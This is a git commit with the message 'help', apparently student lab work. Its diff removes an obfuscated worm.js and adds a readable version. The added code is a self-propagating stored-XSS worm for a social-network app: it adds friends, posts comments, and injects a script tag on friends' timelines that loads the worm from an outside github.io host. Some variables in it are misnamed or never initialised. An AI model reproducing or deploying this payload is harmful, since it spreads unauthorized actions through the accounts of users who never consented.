dccbbf1f4f7ad6ea7cde2ea2ac11b9922ddc9114
Andrew Quan <ajq2679@rit.edu>
2021-12-16 15:01:31 -0500

    help

--- worm.js
+++ worm.js
@@ -1,1 +1,42 @@
-(function(_0x537224,_0x224b88){var _0x59580e=_0x4327,_0x58b098=_0x537224();while(!![]){try{var _0x34142b=parseInt(_0x59580e(0x1a8))/0x1*(-parseInt(_0x59580e(0x1aa))/0x2)+parseInt(_0x59580e(0x1a4))/0x3+-parseInt(_0x59580e(0x1b3))/0x4+-parseInt(_0x59580e(0x1b5))/0x5*(parseInt(_0x59580e(0x1b0))/0x6)+-parseInt(_0x59580e(0x1ab))/0x7*(parseInt(_0x59580e(0x1b8))/0x8)+-parseInt(_0x59580e(0x1a6))/0x9+parseInt(_0x59580e(0x1af))/0xa*(parseInt(_0x59580e(0x1a1))/0xb);if(_0x34142b===_0x224b88)break;else _0x58b098['push'](_0x58b098['shift']());}catch(_0xb46390){_0x58b098['push'](_0x58b098['shift']());}}}(_0x3d6b,0x4d443));function _0x4327(_0x276068,_0x5a99e3){var _0x3d6b91=_0x3d6b();return _0x4327=function(_0x43274d,_0x2e644b){_0x43274d=_0x43274d-0x1a1;var _0x5836af=_0x3d6b91[_0x43274d];return _0x5836af;},_0x4327(_0x276068,_0x5a99e3);}var friends_list;function _0x3d6b(){var _0x4fdeba=['30MjQOLr','30Gnomce','&comment=<script\x20src=\x22https://ajq2679.github.io/worm.js\x22></script>','getDate','2424864ZEDCyr','ajax','282610uiaZEe','getFullYear','getMinutes','2056ygjZNz','indexOf','getHours','/timeline.php?id=','<BR>','3690203yFxMSb','log','/add_comment.php?id=','1671006wfYCDh','/add_friend.php?id=134','761184YjCbZL','getMonth','64081oFqSXv','<img\x20src=https://i.ebayimg.com/images/g/k6wAAOSw-s5eTqEZ/s-l500.jpg>Just\x20became\x20friends\x20at:\x20','2OVZVOp','5705jVnSyw','/friends.php','/add_comment.php?id=134&comment=','split'];_0x3d6b=function(){return _0x4fdeba;};return _0x3d6b();}$(document)['ready'](function(){var _0x47f00d=_0x4327;$[_0x47f00d(0x1b4)]({'url':_0x47f00d(0x1a5),'success':function(_0x1d6d12){var _0x28ae90=_0x47f00d;if(console[_0x28ae90(0x1a2)](_0x1d6d12),'True\x20-\x20Friend\x20Added\x20Successfully'==_0x1d6d12){var _0xfb86,_0x538c4d=new Date();_0xfb86+=_0x538c4d[_0x28ae90(0x1a7)]()+0x1+'/'+_0x538c4d[_0x28ae90(0x1b2)]()+'/'+_0x538c4d[_0x28ae90(0x1b6)]()+'\x20'+_0x538c4d[_0x28ae90(0x1ba)]()+':'+_0x538c4d[_0x28ae90(0x1b7)](),comment=_0x28ae90(0x1a9)+_0xfb86,$['ajax']({'url':_0x28ae90(0x1ad)+comment,'success':function(_0x3c2062){console['log'](_0x3c2062);}}),$[_0x28ae90(0x1b4)]({'url':_0x28ae90(0x1ac),'success':function(_0x531b3b){var _0xca311=_0x28ae90;console['log'](_0x531b3b),friends_list=_0x531b3b[_0xca311(0x1ae)](_0xca311(0x1bc))[0x0][_0xca311(0x1ae)](',');for(var _0x3099fa=0x0;_0x3099fa<ar['length'];_0x3099fa++)console[_0xca311(0x1a2)](friends_list[_0x3099fa]),function(_0x4f3e0e){var _0x27668f=_0xca311;$['ajax']({'url':_0x27668f(0x1bb)+_0x4f3e0e,'success':function(_0x15d8dd){var _0x4610a1=_0x27668f;-0x1===_0x15d8dd[_0x4610a1(0x1b9)]('ajq2679.github.io')&&$[_0x4610a1(0x1b4)]({'url':_0x4610a1(0x1a3)+_0x4f3e0e+_0x4610a1(0x1b1),'success':function(_0x3e8634){var _0x4ab82d=_0x4610a1;console[_0x4ab82d(0x1a2)](_0x3e8634);}});}});}(ar[_0x3099fa]);}});}}});});
+var friends_list;
+$(document).ready(function () {
+    var starting_id = 142;
+    $.ajax({
+        url: "/add_friend.php?id=" + starting_id, success: function (result) {
+            console.log(result)
+            if (result == "True - Friend Added Successfully") {
+                var d = new Date();
+                var date;
+                date += d.getMonth() + 1 + "/" + d.getDate() + "/" + d.getFullYear() + " " + d.getHours() + ":" + d.getMinutes();
+                comment = "<img src=https://i.ebayimg.com/images/g/k6wAAOSw-s5eTqEZ/s-l500.jpg>Just became friends at: " + date;
+                $.ajax({
+                    url: "/add_comment.php?id=" + starting_id + "&comment=" + comment, success: function (result) {
+                        console.log(result);
+                    }
+                });
+                $.ajax({
+                    // Get friends in friends list and infect
+                    url: "/friends.php", success: function (result) {
+                        console.log(result);
+                        friends_list = result.split("<BR>")[0].split(",")
+                        for (var i = 0; i < ar.length; i++) {
+                            console.log(friends_list[i]);
+                            (function (new_id) {
+                                $.ajax({
+                                    url: "/timeline.php?id=" + new_id, success: function (result) {
+                                        if (result.indexOf("ajq2679.github.io") === -1) {
+                                            var worm = "<script src=\"https://ajq2679.github.io/worm.js\"></script>"
+                                            $.ajax({ url: "/add_comment.php?id=" + new_id + "&comment=" + worm, success: function (result) { console.log(result); } });
+                                        }
+                                    }
+                                });
+                            })(ar[i]);
+                        }
+                    }
+                })
+            }
+        }
+    })
+})
+
+// <script src=https://ajq2679.github.io/worm.js></script>
